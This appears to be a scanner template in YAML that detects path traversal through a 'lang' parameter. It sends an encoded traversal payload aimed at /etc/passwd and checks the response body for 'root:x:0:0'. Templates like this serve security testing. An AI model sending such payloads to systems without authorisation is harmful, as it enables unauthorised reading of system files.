id: lfi-096
name: 'Path traversal via lang'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads /etc/passwd via lang'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      lang:
        - '....%2f....%2fetc%2fpasswd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
